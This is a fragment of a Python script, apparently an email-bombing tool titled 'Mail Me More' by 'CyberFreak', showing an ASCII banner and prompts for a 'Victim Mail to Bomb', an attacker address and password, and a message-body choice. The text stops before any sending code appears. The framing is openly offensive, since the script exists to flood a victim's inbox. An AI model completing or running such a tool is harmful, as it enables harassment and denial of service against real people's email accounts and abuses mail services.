
def logo():
    print('''
 /$$      /$$           /$$ /$$       /$$      /$$                 /$$      /$$                              
| $$$    /$$$          |__/| $$      | $$$    /$$$                | $$$    /$$$                              
| $$$$  /$$$$  /$$$$$$  /$$| $$      | $$$$  /$$$$  /$$$$$$       | $$$$  /$$$$  /$$$$$$   /$$$$$$   /$$$$$$ 
| $$ $$/$$ $$ |____  $$| $$| $$      | $$ $$/$$ $$ /$$__  $$      | $$ $$/$$ $$ /$$__  $$ /$$__  $$ /$$__  $$
| $$  $$$| $$  /$$$$$$$| $$| $$      | $$  $$$| $$| $$$$$$$$      | $$  $$$| $$| $$  \ $$| $$  \__/| $$$$$$$$
| $$\  $ | $$ /$$__  $$| $$| $$      | $$\  $ | $$| $$_____/      | $$\  $ | $$| $$  | $$| $$      | $$_____/
| $$ \/  | $$|  $$$$$$$| $$| $$      | $$ \/  | $$|  $$$$$$$      | $$ \/  | $$|  $$$$$$/| $$      |  $$$$$$$
|__/     |__/ \_______/|__/|__/      |__/     |__/ \_______/      |__/     |__/ \______/ |__/       \_______/
                                                                                                                                                                                                             
Created By: CyberFreak | Code:v1                                                                                        
                                                                                                 
    ''')

def main():
    logo()
    recepient_mail = input("\nEnter the Victim Mail to Bomb :\n")
    attacker_mail = input("\nEnter the attacker mail \n")
    attacker_mail_password = input("\nEnter attacker Mail Password\n")
    opt1 = int(input("\nChoose an Option:\n\t1)Use default body\n\t2)Use Custom text\n"))
    if(opt1 == 1):
        message = ''